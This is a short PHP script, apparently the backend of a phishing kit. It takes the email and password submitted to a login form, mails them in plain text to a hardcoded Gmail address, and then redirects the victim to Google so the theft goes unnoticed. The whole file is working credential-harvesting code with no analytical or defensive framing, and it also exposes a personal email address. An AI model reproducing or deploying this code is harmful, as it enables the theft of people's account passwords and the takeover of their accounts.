<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Configurar los detalles del correo electrónico
    $to = "martinhr1303@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: " . htmlspecialchars($email) . "\n";
    $message .= "Contraseña: " . htmlspecialchars($password) . "\n";
    $headers = "From: noreply@tudominio.com\r\n";
    
    // Enviar el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a Google después de enviar el correo
        header('Location: https://www.google.com');
        exit();
    } else {
        echo "Error al enviar el correo electrónico.";
    }
} else {
    // Si se accede al archivo directamente, redirigir al formulario de login
    header('Location: index.html');
    exit();
}
?>
